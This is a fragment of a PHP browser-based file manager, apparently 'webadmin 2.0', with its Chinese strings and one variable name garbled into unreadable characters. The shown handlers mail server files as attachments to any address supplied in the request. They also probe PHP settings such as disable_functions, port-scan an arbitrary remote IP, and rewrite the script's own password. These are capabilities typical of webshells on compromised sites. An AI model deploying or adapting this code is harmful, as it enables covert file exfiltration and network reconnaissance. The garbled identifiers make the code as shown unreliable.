parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay11');
parent.$$('oldname').value="";
</script>
<?
	  die();   
}
//Bing����ӿ�---------------------------
if($action=="Bing"){
$txt = ereg_replace("\t","<br>",$txt); 
$txt = ereg_replace("\r","<br>",$txt); 
$txt = ereg_replace("\n","<br>",$txt); 
//$txt =GetGB2312String($txt);
echo "ԭ��:";
echo $txt."<hr>";
echo "����:";
$txt=iconv('GB2312','UTF-8',$txt);
echo iconv('UTF-8', 'GB2312',language($txt,'',$to));
	  die();
}



//-----���͵����ʼ�----------------------------------------
if($action=="email"){//�����ʼ�
$body2=$body;
//$boundary = uniqid( "");//����ֽ��� 
$boundary = base64_encode(time())."design.by.webadmin.2.0";
$headers = "From: $from
MIME-Version: 1.0
X-Priority: 3
Content-type: multipart/mixed; boundary=\"$boundary\"";//�����ʼ�ͷ
$mimeType = "application/unknown";//MIME����
$textType = ($T_type?"text/html":"text/plain");
$body = "--$boundary
Content-type: $textType; charset=gb2312
Content-transfer-encoding: 8bit

$body

";
if(!empty($file)){ 
           for($i=0;$i<=count($file)-1;$i++) {
           if(!is_dir($filename = "$dir/$file[$i]")){
           $fd = fopen( $filename, "r" );
	$read=chunk_split(base64_encode(@fread($fd, filesize($filename))));
	fclose( $fd );
$body.="--$boundary
Content-type: $mimeType; name=".$file[$i]."
Content-disposition: attachment; filename=".$file[$i]."
Content-transfer-encoding: base64

$read
";
$��Ϣ= "����".$file[$i]."���ӳɹ�";
} else $��Ϣ= $file[$i]."���ļ��в��ܷ���";
}//end_for
}//endif
 else $��Ϣ= "������ûѡ���ļ�������û�з��͸���";
$body.="--$boundary--";
if(@mail($to, $subject, $body, $headers)){
	$��Ϣ= "�ʼ����͵�".$to."���,�����";
}else if(file_exists ('class.phpmailer.php')){	
  $��Ϣ= @smtp_mail($color4,$color7,$color5,$color6,$to,"You",$subject,$body2, $from,"�����ļ�������",$dir,$file); 
}else{
	$��Ϣ="��������֧��mail����,Ҳû���ҵ� class.phpmailer.php,class.smtp.php ����ļ�!";
}
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.alert("<?=$��Ϣ?>"); 
parent.showidg('smallLay17');
</script>
<?
	  die();   
}
//--------�༭mp3------------------------------
if($action=="mp3"){
$AE = new AudioExif;
$file = $mp3file;
if($AE->CheckSize($file)=='true'){

$pa = array('Title' => $Title, 
            'Artist' => $Artist, 
            'AlbumTitle' => $AlbumTitle, 
            'Copyright' => $Copyright,
            'Description' => $Description,
            'Year' => $Year,
            'Genre' => $Genre);
$AE->SetInfo($file, $pa);
$��Ϣ="�༭ $mp3file �ļ�ͷ�ɹ�";
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay18');
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
</script>
<?
}
die();
}
//-------̽�����ü��---------------------------
if($phpvarname!="") {
$��Ϣ="���ò��� ".$phpvarname." �����: ".getphpcfg($phpvarname);
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
	die();
}

//--------ϵͳ����--------------------------------
if($adminpassssj=="yes"){

if($adminpass!=md5($adminpass_j)){ 
	$��Ϣ= "���������!";
}else{
$adminpass_new=md5($adminpass_new);
$file_self=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)));
$fp=@fopen("./$file_self","r");
$msg=@fread($fp,@filesize("./$file_self"));

$msg=@str_replace("\$adminpass=\"".$adminpass."\"","\$adminpass=\"".$adminpass_new."\"",$msg);
$msg=@str_replace("\$color1=\"".$color1."\"","\$color1=\"".$color1_new."\"",$msg);
$msg=@str_replace("\$color2=\"".$color2."\"","\$color2=\"".$color2_new."\"",$msg);
$msg=@str_replace("\$color3=\"".$color3."\"","\$color3=\"".$color3_new."\"",$msg);
$msg=@str_replace("\$color4=\"".$color4."\"","\$color4=\"".$color4_new."\"",$msg);
$msg=@str_replace("\$color5=\"".$color5."\"","\$color5=\"".$color5_new."\"",$msg);
$msg=@str_replace("\$color6=\"".$color6."\"","\$color6=\"".$color6_new."\"",$msg);
$msg=@str_replace("\$color7=\"".$color7."\"","\$color7=\"".$color7_new."\"",$msg);
$msg=@str_replace("\$color8=\"".$color8."\"","\$color8=\"".$color8_new."\"",$msg);
$msg=@str_replace("\$color9=\"".$color9."\"","\$color9=\"".$color9_new."\"",$msg);
$msg=@str_replace("\$color10=\"".$color10."\"","\$color10=\"".$color10_new."\"",$msg);
$msg=@str_replace("\$color11=\"".$color11."\"","\$color11=\"".$color11_new."\"",$msg);
$msg=@str_replace("\$color12=\"".$color12."\"","\$color12=\"".$color12_new."\"",$msg);
@fclose($fp); 
$fp=@fopen("./$file_self","w");
@fwrite($fp,$msg);
if(@fclose($fp)) $��Ϣ= "��Ļ��������Ѿ��޸�";
else $��Ϣ= "�޸�ʧ�ܣ�"; 
}

?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay');
</script>
<?
	  die();   
}



if($bj==2){

	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "�������ϴ�";

	$adminmail=(isset($_SERVER["SERVER_ADMIN"])) ? "<a href=\"mailto:".$_SERVER["SERVER_ADMIN"]."\">".$_SERVER["SERVER_ADMIN"]."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";

	$dis_func = get_cfg_var("disable_functions");
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";

	$info[0]  = array("������ʱ��",date("Y��m��d�� h:i:s",time()));
	$info[1]  = array("����������","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
	$info[2]  = array("������IP��ַ",gethostbyname($_SERVER["SERVER_NAME"]));
	$info[3]  = array("����������ϵͳ",PHP_OS);
	$info[5]  = array("����������ϵͳ���ֱ���",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$info[6]  = array("��������������",$_SERVER["SERVER_SOFTWARE"]);
	$info[7]  = array("Web����˿�",$_SERVER["SERVER_PORT"]);
	$info[8]  = array("PHP���з�ʽ",strtoupper(php_sapi_name()));
	$info[9]  = array("PHP�汾",PHP_VERSION);
	$info[10] = array("�����ڰ�ȫģʽ",getphpcfg("safemode"));
	$info[11] = array("����������Ա",$adminmail);
	$info[12] = array("���ļ�·��",__FILE__);
	
	$info[13] = array("����ʹ�� URL ���ļ� allow_url_fopen",getphpcfg("allow_url_fopen"));
	$info[14] = array("������̬�������ӿ� enable_dl",getphpcfg("enable_dl"));
	$info[15] = array("��ʾ������Ϣ display_errors",getphpcfg("display_errors"));
	$info[16] = array("�Զ�����ȫ�ֱ��� register_globals",getphpcfg("register_globals"));
	$info[17] = array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc"));
	$info[18] = array("�����������ʹ���ڴ��� memory_limit",getphpcfg("memory_limit"));
	$info[19] = array("POST����ֽ��� post_max_size",getphpcfg("post_max_size"));
	$info[20] = array("��������ϴ��ļ� upload_max_filesize",$upsize);
	$info[21] = array("���������ʱ�� max_execution_time",getphpcfg("max_execution_time")."��");
	$info[22] = array("�����õĺ��� disable_functions",$dis_func);
	$info[23] = array("phpinfo()",$phpinfo);
	$info[24] = array("Ŀǰ���п���ռ�diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');

	$info[25] = array("ͼ�δ��� GD Library",getfun("imageline"));
	$info[26] = array("IMAP�����ʼ�ϵͳ",getfun("imap_close"));
	$info[27] = array("MySQL���ݿ�",getfun("mysql_close"));
	$info[28] = array("SyBase���ݿ�",getfun("sybase_close"));
	$info[29] = array("Oracle���ݿ�",getfun("ora_close"));
	$info[30] = array("Oracle 8 ���ݿ�",getfun("OCILogOff"));
	$info[31] = array("PREL�����﷨ PCRE",getfun("preg_match"));
	$info[32] = array("PDF�ĵ�֧��",getfun("pdf_close"));
	$info[33] = array("Postgre SQL���ݿ�",getfun("pg_close"));
	$info[34] = array("SNMP�������Э��",getfun("snmpget"));
	$info[35] = array("ѹ���ļ�֧��(Zlib)",getfun("gzclose"));
	$info[36] = array("XML����",getfun("xml_set_object"));
	$info[37] = array("FTP",getfun("ftp_login"));
	$info[38] = array("ODBC���ݿ�����",getfun("odbc_close"));
	$info[39] = array("Session֧��",getfun("session_start"));
	$info[40] = array("Socket֧��",getfun("fsockopen"));
?>
<table width="100%" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="secondalt"><input value="pq" name="yl" size="2" type="hidden">
    <td style="padding-left: 5px;">���������ò���(��:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40" id=st> <input type="submit" value="�鿴" class="input" id=st><input name="action" type="hidden" value="viewphpvar"></td>
  </tr>
<?php
	for($a=0;$a<3;$a++){
		if($a == 0){
			$hp = array("server","����������");
		}elseif($a == 1){
			$hp = array("php","PHP��������");
		}elseif($a == 2){
			$hp = array("basic","���֧��״��");
		}
?>
  <tr>
    <td style="padding-left: 5px;"><b><?=$hp[1]?></b> 
    <?if($phpinfo!='No'){?>
    	<a href="?bj=1&A=8" target="_blank">�鿴 phpinfo()</a>
    <?}?>
    	</td>
  </tr>
  <tr>
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?

		if($a == 0){
			for($i=0;$i<=12;$i++){
if($i%2==1){
$color= "#EFEFEF";
}else{
$color= "#FFFFFF";
}
				echo "<tr STYLE=background-color:".$color."><td width=300 style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 1){
			for($i=13;$i<=24;$i++){
if($i%2==1){
$color= "#EFEFEF";
}else{
$color= "#FFFFFF";
}
				echo "<tr STYLE=background-color:".$color."><td width=300 style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 2){
			for($i=25;$i<=40;$i++){
if($i%2==1){
$color= "#EFEFEF";
}else{
$color= "#FFFFFF";
}
				echo "<tr STYLE=background-color:".$color."><td width=300 style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?
	}//for

die(); 
}else if($bj==3){
	
	$zip = new Zip;
	$l=$zip->get_list($dir."/".$fileName);
?>
<table border="0" width="100%">
	<tr>
		<td width="15"></td>
		<td>�ļ���</td>
		<td width="250">·��</td>
		<td width="150">ʵ�ʴ�С</td>
		<td width="150">ѹ����С</td>
		<td width="150">ѹ����</td>
	</tr>
<?
	for($k=0;isset($l[$k]);$k++){
		$h=$l[$k];  
		$name=$h[stored_filename]; 
		$isdir=$h[folder]; 
		$id=$h[index]; 
		$sub=""; 
		$mdir = dirname($name)."/";
		if(!$h[folder]){ 
			$s=$h[size]; 
			$cs=$h[compressed_size]; 
			$un="Bytes"; 
			$uni="Bytes"; 
			$ext=strtolower(substr($name,-4));
			if($ext==".gif"||$ext==".jpg"||$ext==".png"||$ext==".bmp"){}
			$ratio=@intval($cs/($s/100)+0,00001);
			if($s>1000){$s=substr($s/1000,0,5); $un="Kb"; }
			if($s>1000){$s=substr($s/1000,0,5); $un="Mb"; }
			if($s>1000){$s=substr($s/1000,0,5); $un="Gb"; }
			if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Kb"; }
			if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Mb"; }
			if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Gb"; } 
?>
<tr style="background:<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover="this.style.background='#F7E882'" onmouseout="this.style.background='<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>'">
		<td width="15"><div class="<?=Fname($name)?>"></div></td>
		<td><?=$name?></td>
		<td width="250"><?=$sub?><?=$mdir?></td>
		<td width="150"><?=$s?><?=$un?></td>
		<td width="150"><?=$cs?><?=$uni?></td>
		<td width="150"><?=$ratio?> %</td>
	</tr>
<?
		}
	}
	if($k==0){
		echo "<tr><td colspan=5 align=center><b>= �յ�ZIP�ļ� =</b></td></tr>";
	}
$centd = ReadCentralDir($dir."/".$fileName);
if($centd[comment]!=""){
?>
<tr>
<td height="300"  colspan="6">
<textarea name="S1" style="height:100%;width:100%">
<?
echo "ע��:\n\n".$centd[comment];
?>
</textarea></td>
</tr>
<?}?>
</table>
<?	
die(); 
}else if($bj==4){
//---------------------------����Ŀ¼---------------------------------------
function show_list($path){

    if(is_dir($path)){
        $dp=dir($path);
        while($file=$dp->read())
            if($file!='.'&&$file!='..')
                show_list($path.'/'.$file);
        $dp->close();
                $k++;
    }
$size=byte_format(filesize($path));
if(!is_dir($path)){
?>
<tr style="background:<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');">
<td><div class="<?=Fname($path)?>"></div></td>
<td><a href=<?=$path;?> target="_blank"><?=basename($path)?></a></td>
<td><a href=?dir=<?=dirname($path);?>><?=dirname($path)?></td>
<td align="right"><?=$size?></td>
<td align=center><?=substr(base_convert(fileperms($path),10,8),-4)?></td>
<td align=center><?=date("Y-n-d H:i",filectime($path))?></td>
</tr>
<?
}
}
?>
<table class="t1" width="100%" cellspacing="1" cellpadding="1" bgcolor=#ffffff>
<tr STYLE=background-color:expression(rowIndex%2==1?'#EFEFEF':'#FFFFFF')>
<td width="15"></td>
<td>�ļ���</td>
<td>·��</td>
<td width="120" align="center">�ļ���С</td>
<td width="120" align="center">����</td>
<td width="150" align="center">��������</td>
</tr>
<?show_list($dir);?>
</table>
<?
die(); 
}else if($bj==5){
function show_listzsa($path, $bl) {//�����ļ�

        $bl = eregi_replace("\*", "", $bl);
        if (is_dir($path)) {
            $dp = dir($path);
            while ($file = $dp->read())
            if ($file != '.' && $file != '..')
            show_listzsa($path.'/'.$file, $bl);
            $dp->close();
            $k++;
        }
if (similar_text(basename($path), $bl)==strlen($bl)) {
$msg=@str_replace($bl,"<font color=#ff0000>".$bl."</font>",basename($path))."\n";
$size = byte_format(filesize($path));
?>
<tr style="background:<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($k%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');">
<td width="15"><div class="<?=Fname($msg)?>"></div></td>
<td><a href=<?=$path?> target="_blank"><?=$msg?></a></td>
<td><a href=?dir=<?=dirname($path);?>><?=dirname($path)?></a></td>
<td width="120" align="right"><?=$size?></td>
<td width="120" align=center><?=substr(base_convert(fileperms($path),10,8),-4)?></td>
<td width="150" align=center><?=date("Y-n-d H:i",filectime($path))?></td>
</tr>
        <?php
        }
}
?>
<table class="t1" width="100%" cellspacing="1" cellpadding="1" bgcolor=#ffffff>
<tr>
<td width="15"></td>
<td STYLE="word-break: break-all"><b>�ļ���</b></td>
<td STYLE="word-break: break-all"><b>·��</b></td>
<td width=120 align=center STYLE="word-break: break-all">�ļ���С</td>
<td width=120 align=center STYLE="word-break: break-all">����</td>
<td width=150 align=center STYLE="word-break: break-all">��������</td>
</tr>
<?
show_listzsa($dir,"$bl");
?>
</table>
<?
die(); 
}else if($bj==7){
 
if (!empty($remoteip)){ 
// ���������Ϊ�վͽ���IP��ַ��ʽ���ж�
function err() { 
         die("�Բ��𣬸�IP��ַ���Ϸ�"); 
} 
// �����ύ����IP����ʾ��Ϣ
$ips=explode(".",$remoteip); 
// ��.�ָ�IP��ַ
if (intval($ips[0])<1 or intval($ips[0])>255 or intval($ips[3])<1 or intval($ips[3]>255)){
$remoteip=gethostbyname($remoteip);
$ips=explode(".",$remoteip); 
}else if (intval($ips[0])<1 or intval($ips[0])>255 or intval($ips[3])<1 or intval($ips[3]>255)){
	err(); 
}
// �����һ�κ����һ��IP������С��1���ߴ���255������ʾ����
if (intval($ips[1])<0 or intval($ips[1])>255 or intval($ips[2])<0 or intval($ips[2]>255)){
$remoteip=gethostbyname($remoteip);
$ips=explode(".",$remoteip); 
}else if (intval($ips[1])<0 or intval($ips[1])>255 or intval($ips[2])<0 or intval($ips[2]>255)){
	 err(); 
}
// ����ڶ��κ͵�����IP������С��0���ߴ���255������ʾ����
$closed='�˶˿�Ŀǰ���ڹر�״̬��'; 
$opened='<font color=red>�˶˿�Ŀǰ���ڴ�״̬��</font>'; 
$close="�ر�"; 
$open="<font color=red>��</font>"; 
$port=array(21,23,25,79,80,110,135,137,138,139,143,443,445,1433,3306,3389); 
$msg=array( 
'Ftp', 
'Telnet', 
'Smtp', 
'Finger', 
'Http', 
'Pop3', 
'Location Service', 
'Netbios-NS', 
'Netbios-DGM', 
'Netbios-SSN', 
'IMAP', 
'Https', 
'Microsoft-DS', 
'MSSQL', 
'MYSQL', 
'Terminal Services' 
);     
// ͨ��IP��ʽ�ļ��������鶨����˿ڶ�Ӧ�ķ������Ƽ�״̬
?>
<table cellspacing=1 bgcolor="#EEEEEE" width="100%">
	<tr>
		<td width="50">�˿�</td>
		<td width="240">����</td>
		<td width="80">�����</td>
		<td>����</td>
	</tr>
<?
// �����ʾ�ı���
for($i=0;$i<sizeof($port);$i++) 
{ 
$fp = @fsockopen($remoteip, $port[$i], &$errno, &$errstr, 1); 
   if (!$fp) { 
     echo "<tr bgcolor=#FFFFFF><td>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$close."</td><td>".$closed."</td></tr>\n"; 
   } else { 
     echo "<tr bgcolor=#F4F7F9><td align=center>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$open."</td><td>".$opened."</td></tr>"; 
   } 
} 
// ��for��䣬�ֱ���fsockopen��������Զ����������ض˿ڣ���������
?>
	<tr>
		<td colspan="4"><strong>��ɨ���IP��<font color=red><?=$remoteip?></font></strong></td>
	</tr>
</table>
<? 
exit; 
} 
// ̽�����

die(); 	
}else if($bj==8){
?>
<script language="Javascript" type="text/javascript">
    <!--
    function $$(objid){
    return document.getElementById(objid);
    }

    function octalchange()
    {
        var val = document.chmod_form.t_total.value;
        var stickybin = parseInt(val.charAt(0)).toString(2);
        var ownerbin = parseInt(val.charAt(1)).toString(2);
        while (ownerbin.length<3) { ownerbin="0"+ownerbin; };
        var groupbin = parseInt(val.charAt(2)).toString(2);
        while (groupbin.length<3) { groupbin="0"+groupbin; };
        var otherbin = parseInt(val.charAt(3)).toString(2);
        while (otherbin.length<3) { otherbin="0"+otherbin; };
        document.chmod_form.sticky.checked = parseInt(stickybin.charAt(0));
        document.chmod_form.owner4.checked = parseInt(ownerbin.charAt(0));
        document.chmod_form.owner2.checked = parseInt(ownerbin.charAt(1));
        document.chmod_form.owner1.checked = parseInt(ownerbin.charAt(2));
        document.chmod_form.group4.checked = parseInt(groupbin.charAt(0));
        document.chmod_form.group2.checked = parseInt(groupbin.charAt(1));
        document.chmod_form.group1.checked = parseInt(groupbin.charAt(2));
        document.chmod_form.other4.checked = parseInt(otherbin.charAt(0));
        document.chmod_form.other2.checked = parseInt(otherbin.charAt(1));
        document.chmod_form.other1.checked = parseInt(otherbin.charAt(2));
        calc_chmod(1);
    };
    function calc_chmod(nototals)
    {
      var users = new Array("owner", "group", "other");
      var totals = new Array("","","");
      var syms = new Array("","","");
        for (var i=0; i<users.length; i++)
        {
            var user=users[i];
            var field4 = user + "4";
            var field2 = user + "2";
            var field1 = user + "1";
            var symbolic = "sym_" + user;
            var number = 0;
            var sym_string = "";
            var sticky = "0";
            var sticky_sym = " ";
            if (document.chmod_form.sticky.checked){
                sticky = "1";
                sticky_sym = "t";
            }
            if (document.chmod_form[field4].checked == true) { number += 4; }
            if (document.chmod_form[field2].checked == true) { number += 2; }
            if (document.chmod_form[field1].checked == true) { number += 1; }
            if (document.chmod_form[field4].checked == true) {
                sym_string += "r";
            } else {
                sym_string += "-";
            }
            if (document.chmod_form[field2].checked == true) {
                sym_string += "w";
            } else {
                sym_string += "-";
            }
            if (document.chmod_form[field1].checked == true) {
                sym_string += "x";
            } else {
                sym_string += "-";
            }
            totals[i] = totals[i]+number;
            syms[i] =  syms[i]+sym_string;
      };
        if (!nototals) document.chmod_form.t_total.value = sticky + totals[0] + totals[1] + totals[2];
        document.chmod_form.sym_total.value = syms[0] + syms[1] + syms[2] + sticky_sym;
    }
    function troca(){
        if(document.chmod_form.sticky.checked){document.chmod_form.sticky.checked=false;}else{document.chmod_form.sticky.checked=true;}
    }
    window.onload=octalchange
    //-->
    </script>
</head>
<script language="Javascript" type="text/javascript">
<!--
    function Is(){
        this.appname = navigator.appName;
        this.appversion = navigator.appVersion;
        this.platform = navigator.platform;
        this.useragent = navigator.userAgent.toLowerCase();
        this.ie = ( this.appname == 'Microsoft Internet Explorer' );
        if (( this.useragent.indexOf( 'mac' ) != -1 ) || ( this.platform.indexOf( 'mac' ) != -1 )){
            this.sisop = 'mac';
        } else if (( this.useragent.indexOf( 'windows' ) != -1 ) || ( this.platform.indexOf( 'win32' ) != -1 )){
            this.sisop = 'windows';
        } else if (( this.useragent.indexOf( 'inux' ) != -1 ) || ( this.platform.indexOf( 'linux' ) != -1 )){
            this.sisop = 'linux';
        }
    }

    var is = new Is();
    function enterSubmit(keypressEvent,submitFunc){
        var kCode = (is.ie) ? keypressEvent.keyCode : keypressEvent.which
        if( kCode == 13) eval(submitFunc);
    }
    var W = screen.width;
    var H = screen.height;
    var FONTSIZE = 0;
    switch (W){
        case 640:
            FONTSIZE = 8;
        break;
        case 800:
            FONTSIZE = 10;
        break;
        case 1024:
            FONTSIZE = 12;
        break;
        default:
            FONTSIZE = 14;
        break;
    }
document.writeln(' <style> body { font-family : Arial; font-size: '+FONTSIZE+'px; font-weight : normal; color: 000000; background-color: eeeeee; } table { font-family : Arial; font-size: '+FONTSIZE+'px; font-weight : normal; color: 000000; cursor: default; } input { font-family : Arial; font-size: '+FONTSIZE+'px; font-weight : normal; color: 000000; } textarea { font-family : Courier; font-size: 12px; font-weight : normal; color: 000000; } A { font-family : Arial; font-size : '+FONTSIZE+'px; font-weight : bold; text-decoration: none; color: 000000; } A:link { color: 000000; } A:visited { color: 000000; } A:hover { color: 992929; } A:active { color: 000000; } </style> ');
function property2(){
if($$("newT7").value==""){
confirm("����Ϊ��!");
}else{
           $aa=$$('newT7').value;
	         $$('MFform').action="?action=<?=$actions?>&editperme=<?=$file?>&perming="+$aa+"&dir=<?=$dir?>";
		       $$('MFform').submit();
	      }
	
}
 //-->
</script>
<form method="POST" name="chmod_form" id="MFform">
    <TABLE BORDER="0" CELLSPACING="0" CELLPADDING="4" ALIGN=CENTER>
    <TR ALIGN="LEFT" VALIGN="MIDDLE">
    <TD>����:<input type="text" name="t_total" value="<?=$key?>" size="4" onKeyUp="octalchange()" id="newT7"> </TD>
    <TD><input type="text" name="sym_total" value="" size="12" READONLY="1"></TD>
    </TR>
    </TABLE>
    <table cellpadding="2" cellspacing="0" border="0" ALIGN=CENTER>
    <tr bgcolor="#333333">
    <td WIDTH="60" align="left"> </td>
    <td WIDTH="55" align="center" style="color:#FFFFFF"><b>������
    </b></td>
    <td WIDTH="55" align="center" style="color:#FFFFFF"><b>��Ⱥ
    </b></td>
    <td WIDTH="55" align="center" style="color:#FFFFFF"><b>����
    <b></td>
    </tr>
    <tr bgcolor="#DDDDDD">
    <td WIDTH="60" align="left" nowrap BGCOLOR="#FFFFFF">��</td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="owner4" value="4" onclick="calc_chmod()">
    </td>
    <td WIDTH="55" align="center" bgcolor="#FFFFFF"><input type="checkbox" name="group4" value="4" onclick="calc_chmod()">
    </td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="other4" value="4" onclick="calc_chmod()">
    </td>
    </tr>
    <tr bgcolor="#DDDDDD">
    <td WIDTH="60" align="left" nowrap BGCOLOR="#FFFFFF">д</td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="owner2" value="2" onclick="calc_chmod()"></td>
    <td WIDTH="55" align="center" bgcolor="#FFFFFF"><input type="checkbox" name="group2" value="2" onclick="calc_chmod()">
    </td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="other2" value="2" onclick="calc_chmod()">
    </td>
    </tr>
    <tr bgcolor="#DDDDDD">
    <td WIDTH="60" align="left" nowrap BGCOLOR="#FFFFFF">ִ��</td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="owner1" value="1" onclick="calc_chmod()">
    </td>
    <td WIDTH="55" align="center" bgcolor="#FFFFFF"><input type="checkbox" name="group1" value="1" onclick="calc_chmod()">
    </td>
    <td WIDTH="55" align="center" bgcolor="#EEEEEE">
    <input type="checkbox" name="other1" value="1" onclick="calc_chmod()">
    </td>
    </tr>
    </TABLE>
    <TABLE BORDER="0" CELLSPACING="0" CELLPADDING="4" ALIGN=CENTER>
    <tr><td colspan=2><input type=checkbox id=sticky name=sticky value="1" onclick="calc_chmod()"><label for="sticky"> Sticky Bit</label><td colspan=2 align=right>
    	<input type=button value="Ӧ��" onclick="property2();"></tr>
    </table>
</form>
<?
die();
}


if($button!=""){
?>
<input type="button"  class="submit" name="B3" style="width:62px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -462px;height:21px;" onclick="getData2('?bj=1&A=3&dir=./','M','./'),getData2('?bj=1&A=4&dir=.','F'),getData2('?bj=1&A=5&dir=./','lujing')" value="��Ŀ¼">
<input type="button"  class="submit" name="B3" style="width:85px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -142px;height:21px;" onclick="showid('smallLay3');" value="�½��ļ���">
<input type="button"   class="submit" name="B3" style="width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -238px;height:21px;" onclick="showid('smallLay4');" value="�½��ļ�">
<input type="button"   class="submit" name="B3" style="width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -513px;height:21px;" onclick="wjbz11($$('T2').value,$$('Tdir2').value,'@');" value="�ļ���ע">
<input type="button"   class="submit" name="B3" style="width:73px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -430px;height:21px;" onclick="showid('smallLay15');" value="�滻����">

<?if($button=="php"){?>
<input type="button"  class="submit" name="B3" onclick="getData('?bj=1&A=2&dir='+$$('Tdir').value+'&fileName='+$$('T2').value,'c2')" style="width:88px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -254px;height:21px;" value="php��ʽ��">
<input type="button"  class="submit" name="B3" onclick="getData('?bj=1&A=9&dir='+$$('Tdir').value+'&fileName='+$$('T2').value,'c2')" style="width:98px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -479px;height:21px;" value="php����ѹ��">
<input type="button"  class="submit" name="B3" onclick="phpL()" style="width:98px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -513px;height:21px;" value="php�������">
<?}?>
<?if($button=="js"||$button=="html"||$button=="htm"){?>
	   <select name="tabsize" id="tabsize">
            <option value="1">�Ʊ�������</option>
            <option value="2"> 2���ո�����</option>
            <option value="4" selected="selected">4���ո�����</option>
            <option value="8"> 8���ո�����</option>
        </select>
<input class="submit" type="button" value="js��ʽ��" onclick="return do_js_beautify()"id="beautify" style="width:74px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -254px;height:21px;" title="��Ҫ���ڸ��ӵ�js����">
<input class="submit" type="button" value="js��ͨѹ��" onclick="pack_js(0)" style="width:88px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -496px;height:21px;"  title="��Ҫ���ڸ��ӵ�js����">
<?}?>
<?if($button=="js"){?>
<input class="submit" type="button" value="js����ѹ��" onclick="pack_js(1)" style="width:88px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -513px;height:21px;"  title="��Ҫ���ڸ��ӵ�js����">
<input type="button"  class="submit" name="B3" onclick="jsL()" style="width:98px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -513px;height:21px;" value="JS �������">
<?}?>
<?if($button=="css"){?>
<input type="button"  class="submit" value="CSS��ʽ��" style="width:84px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -254px;height:21px;" onclick="CSS('format');">
<input type="button"  class="submit" value="CSSѹ��" style="width:74px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -479px;height:21px;" onclick="CSS('pack');">
<input type="button"  class="submit" name="B3" onclick="cssL()" style="width:98px;background:#fff url(?imgname=allbgs.gif) no-repeat 0px -513px;height:21px;" value="CSS�������">
<?
}
die();
}

if($iframeA==1){
setcookie("olddira1", $dir, time()+3600000);

?>
<script>
//alert("<?=$olddira1?>");
//parent.window.location="?#<?=$dir?>";
parent.getData3("?dir=<?=urlencode($dir)?>&images=<?=$images?>&A=A3","<?=urlencode($dir)?>","mullu");
</script>
<?
die();
}else if($iframeA==2){
?>	
<script>
parent.getData3('?bj=2','<?=urlencode($dir)?>','mullu');
</script>
<?	
die();	
}else if($iframeA==3){
?>	
<script>
